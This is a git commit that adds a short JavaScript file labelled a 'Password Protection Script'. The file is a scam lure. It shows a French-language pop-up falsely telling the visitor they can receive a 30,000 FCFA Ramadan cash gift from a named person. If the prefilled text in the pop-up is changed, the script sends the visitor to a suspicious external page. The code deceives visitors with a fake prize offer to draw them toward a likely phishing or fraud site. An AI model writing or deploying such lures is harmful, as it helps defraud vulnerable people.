eacd84bf7b95e0809955c8a9dd859b52ac1464b5
Help-All <imaobongumoh637@gmail.com>
2026-03-09 21:20:16 +0100

    Create activeoq.js

---
+++ activeoq.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir le SOUTIEN EN ESPÈCES DE RAMADAN DE 30 000 FCFA DE KABIROU MBODJE. Veuillez appuyer sur OK pour recevoir immédiatement.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://getin-ofer.cfd/30000-Soutien-Au-Ramadan.html';
+  }
